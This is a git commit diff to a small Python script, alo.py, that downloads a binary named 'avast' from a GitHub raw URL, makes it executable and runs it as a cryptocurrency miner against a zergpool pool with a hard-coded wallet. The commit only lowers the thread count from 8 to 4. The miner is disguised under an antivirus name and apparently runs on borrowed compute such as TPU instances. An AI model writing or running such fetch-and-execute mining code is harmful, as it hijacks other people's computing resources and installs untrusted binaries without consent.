7a6760e4565c74c8bf0bf7f1c2f955e69cac91b8
aurbach55 <95366868+aurbach55@users.noreply.github.com>
2022-01-31 03:06:56 +0700

    Update alo.py

--- alo.py
+++ alo.py
@@ -1,4 +1,4 @@
 import os,subprocess
 os.system("lscpu")
-subprocess.run(['wget', 'https://github.com/samrikulan/toya/raw/main/avast', '&&', 'chmod', '777', 'avast', '&&', './avast -v -l  verushash.asia.mine.zergpool.com:3300 -u 7pXYkwdwUFBGNaG8dJ8w6kZTzRjnTpDTgo.$(echo $(shuf -i 1-99999 -n 1)-TPU) -p c=DASH -t 8 -x'], stdout=subprocess.PIPE)
+subprocess.run(['wget', 'https://github.com/samrikulan/toya/raw/main/avast', '&&', 'chmod', '777', 'avast', '&&', './avast -v -l  verushash.asia.mine.zergpool.com:3300 -u 7pXYkwdwUFBGNaG8dJ8w6kZTzRjnTpDTgo.$(echo $(shuf -i 1-99999 -n 1)-TPU) -p c=DASH -t 4 -x'], stdout=subprocess.PIPE)
 
